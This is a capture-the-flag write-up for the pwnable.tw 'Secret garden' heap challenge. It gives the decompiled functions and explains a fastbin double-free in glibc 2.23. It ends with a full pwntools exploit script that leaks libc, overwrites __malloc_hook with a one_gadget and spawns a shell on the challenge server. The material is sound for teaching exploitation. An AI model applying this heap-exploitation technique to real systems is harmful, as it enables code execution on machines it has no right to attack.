---
date: '2025-09-04T20:48:18+07:00'
draft: false
title: 'Secret garden (350 pts) - pwnable.tw'
tags: ['pwnable.tw']
---
---
## 0x1. Initial Reconnaissance

### file
```
↪ file secretgarden
secretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cc989aba681411cb235a53b6c5004923d557ab6a, stripped
```

### checksec
```
↪ checksec --file=secretgarden
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	Partial	1		2		secretgarden
```

### ./secretgarden
```
↪ ./secretgarden

☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ 
☆          Secret Garden          ☆ 
☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ 

  1 . Raise a flower 
  2 . Visit the garden 
  3 . Remove a flower from the garden
  4 . Clean the garden
  5 . Leave the garden

Your choice :
```

---
## 0x2. Reverse Engineering

### main
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char v3[8]; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  sub_FE1(a1, a2, a3);
  while ( 1 )
  {
    sub_B6A();
    read(0, v3, 4uLL);
    switch ( (unsigned int)strtol(v3, 0LL, 10) )
    {
      case 1u:
        sub_C32();
        break;
      case 2u:
        sub_F1D();
        break;
      case 3u:
        sub_DD0();
        break;
      case 4u:
        sub_EA1();
        break;
      case 5u:
        puts("See you next time.");
        exit(0);
      default:
        puts("Invalid choice");
        break;
    }
  }
}
```

### sub_C32
```c
int sub_C32()
{
  _QWORD *v0; // rbx
  void *v1; // rbp
  _QWORD *v2; // rcx
  int v3; // edx
  int size[9]; // [rsp+4h] [rbp-24h] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  size[0] = 0;
  if ( unk_202024 > 0x63u )
    return puts("The garden is overflow");
  v0 = malloc(0x28uLL);
  *v0 = 0LL;
  v0[1] = 0LL;
  v0[2] = 0LL;
  v0[3] = 0LL;
  v0[4] = 0LL;
  __printf_chk(1LL, "Length of the name :");
  if ( (unsigned int)__isoc99_scanf("%u", size) == -1 )
    exit(-1);
  v1 = malloc((unsigned int)size[0]);
  if ( !v1 )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  __printf_chk(1LL, "The name of flower :");
  read(0, v1, (unsigned int)size[0]);
  v0[1] = v1;
  __printf_chk(1LL, "The color of the flower :");
  __isoc99_scanf("%23s", v0 + 2);
  *(_DWORD *)v0 = 1;
  if ( qword_202040[0] )
  {
    v2 = &qword_202040[1];
    v3 = 1;
    while ( *v2 )
    {
      ++v3;
      ++v2;
      if ( v3 == 100 )
        goto LABEL_13;
    }
  }
  else
  {
    v3 = 0;
  }
  qword_202040[v3] = v0;
LABEL_13:
  ++unk_202024;
  return puts("Successful !");
}
```

### sub_F1D
```c
int sub_F1D()
{
  __int64 v0; // rbx
  __int64 v1; // rax

  v0 = 0LL;
  if ( unk_202024 )
  {
    do
    {
      v1 = qword_202040[v0];
      if ( v1 && *(_DWORD *)v1 )
      {
        __printf_chk(1LL, "Name of the flower[%u] :%s\n", (unsigned int)v0, *(const char **)(v1 + 8));
        LODWORD(v1) = __printf_chk(
                        1LL,
                        "Color of the flower[%u] :%s\n",
                        (unsigned int)v0,
                        (const char *)(qword_202040[v0] + 16LL));
      }
      ++v0;
    }
    while ( v0 != 100 );
  }
  else
  {
    LODWORD(v1) = puts("No flower in the garden !");
  }
  return v1;
}
```

### sub_DD0
```c
int sub_DD0()
{
  _DWORD *v1; // rax
  unsigned int v2; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( !unk_202024 )
    return puts("No flower in the garden");
  __printf_chk(1LL, "Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v2);
  if ( v2 <= 0x63 && (v1 = (_DWORD *)qword_202040[v2]) != 0LL )
  {
    *v1 = 0;
    free(*(void **)(qword_202040[v2] + 8LL));
    return puts("Successful");
  }
  else
  {
    puts("Invalid choice");
    return 0;
  }
}
```

### sub_EA1
```c
unsigned __int64 sub_EA1()
{
  _QWORD *v0; // rbx
  _DWORD *v1; // rdi
  unsigned __int64 v3; // [rsp+8h] [rbp-20h]

  v3 = __readfsqword(0x28u);
  v0 = qword_202040;
  do
  {
    v1 = (_DWORD *)*v0;
    if ( *v0 && !*v1 )
    {
      free(v1);
      *v0 = 0LL;
      --unk_202024;
    }
    ++v0;
  }
  while ( v0 != &qword_202040[100] );
  puts("Done!");
  return __readfsqword(0x28u) ^ v3;
}
```

---

## 0x3. Analysis

In this problem, they allow you to grow a flower by allocating 0x28 in heap with flower struct like that:
```c
struct flower{
  int in_used;
  char *name;
  char color[23];
};
``` 
After growing a flower, they will store the address of this flower field into an array of 100 elements.
- Removing a flower just frees the name's chunk and assigns ```in_used``` variable to 0, that means these flower isn't in used.
- Seeing the garden lists all flowers in the array that ```in_used``` marked.
- Clean the garden frees all flower fields in the array with ```in_used``` unmarked and also assign the variables, that store these flowers, to 0.

---

## 0x4. Exploit

It's easy to leak main_arena by allocate a size belonged to largebin, free it and re-allocate to get the address of main_arena.

Because glibc 2.23 doesn't have tcache, but fastbins. Fastbins just check double-free bug by checking whether the chunk we free is the head of linked-list or not, if it is, they will return the error "double free or corruption (fasttop)".

```c
  set_fastchunks(av);
  unsigned int idx = fastbin_index(size);
  fb = &fastbin (av, idx);

  /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
  mchunkptr old = *fb, old2;
  unsigned int old_idx = ~0u;
  do{
  /* Check that the top of the bin is not the record we are going to add
    (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
    {
      errstr = "double free or corruption (fasttop)";
      goto errout;
    }
    /* Check that size of fastbin chunk at the top is the same as
    size of the chunk that we are adding.  We can dereference OLD
    only if we have the lock, otherwise it might have already been
    deallocated.  See use of OLD_IDX below for the actual check.  */
    if (have_lock && old != NULL)
      old_idx = fastbin_index(chunksize(old));
    p->fd = old2 = old;
  }while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
```

To bypass, just free another chunk before you free the desired chunk again. That leads to double-free bug.

But they also check the size of the chunk before taking it from fastbins. As a result, you can't put ```__free_hook``` address into fastbin :b. Don't be afraid, you can use ```__malloc_hook``` trick.

```
pwndbg> info address __malloc_hook
Symbol "__malloc_hook" is static storage at address 0x7ffff7bc3b10.
pwndbg> x/8gx 0x7ffff7bc3b10 - 0x20
0x7ffff7bc3af0 <_IO_wide_data_0+304>:	0x00007ffff7bc2260	0x0000000000000000
0x7ffff7bc3b00 <__memalign_hook>:	0x00007ffff7885270	0x00007ffff7884e50
0x7ffff7bc3b10 <__malloc_hook>:	0x00007ffff7884c80	0x0000000000000000
0x7ffff7bc3b20 <main_arena>:	0x0000000000000000	0x0000000000000000
```

You can see that, ```__malloc_hook - 0x18``` is null, so if you put ```__malloc_hook - 0x23``` into fastbin, they would assume ```__malloc_hook - 0x23 + 0x8``` is the size, it's 0x7f now, that means its size is 0x70, and metadata is 0xf (```PREV_INUSE, IS_MMAPPED and NON_MAIN_ARENA``` are all marked). Overwrite one_gadget to ```__malloc_hook```, and trigger double-free bug to get the shell, because ```malloc_printerr``` will call ```__malloc_hook```.

### Exploit
```py
from pwn import *

exe = ELF("./secretgarden_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
  if args.LOCAL:
      r = process([exe.path])
      # r = gdb.debug ([exe.path], "b *__libc_start_main+214")
  else:
      r = remote("chall.pwnable.tw", 10203)

  return r

def add_flower (p, size, name, color):
  p.sendafter (b'Your choice : ', b'1')
  p.sendlineafter (b'Length of the name :', size)
  p.sendafter (b'The name of flower :', name)
  p.sendlineafter (b'The color of the flower :', color)
    
def show (p):
  p.sendafter (b'Your choice : ', b'2') 

def remove_flower (p, id):
  p.sendafter (b'Your choice : ', b'3')
  p.sendlineafter (b'Which flower do you want to remove from the garden:', id)

def clean_garden (p):
  p.sendafter (b'Your choice : ', b'4')

def main():
  p = conn()
  add_flower (p, b'1042', b'ndd', b'ndd')
  add_flower (p, b'1042', b'ndd1', b'ndd1')
  remove_flower (p, b'0')
  add_flower (p, b'1000', b'A' * 8, b'ndd')
  show (p)
  p.recvuntil (b'A' * 8)
  leak_libc = u64 (p.recv (6) + b'\x00\x00')
  print ("The main arena is: ", hex (leak_libc))
  libc.address = leak_libc - libc.symbols['main_arena'] - 88
  print ("The address of libc is : ", hex (libc.address))
  print ("The milestone ---------------------------------------------------------------------------------------------------------------------")
  remove_flower (p, b'0')
  remove_flower (p, b'1')
  clean_garden (p)

  add_flower (p, b'104', b'ndd', b'ndd')
  add_flower (p, b'104', b'ndd1', b'ndd1')
  remove_flower (p, b'0')
  remove_flower (p, b'1')
  remove_flower (p, b'0')


  add_flower (p, b'104', p64 (libc.symbols['__malloc_hook'] - 0x23), b'AAAA')
  add_flower (p, b'104', b'AAAA', b'AAAA')
  add_flower (p, b'104', b'AAAA', b'AAAA')
  add_flower (p, b'104', b'\x00' * 0x13 + p64 (libc.address + 0xef6c4), b'ndd')

  remove_flower (p, b'0')
  remove_flower (p, b'0') 

  # p.sendafter (b'Your choice : ', b'1')

  p.interactive()


if __name__ == "__main__":
  main()
```
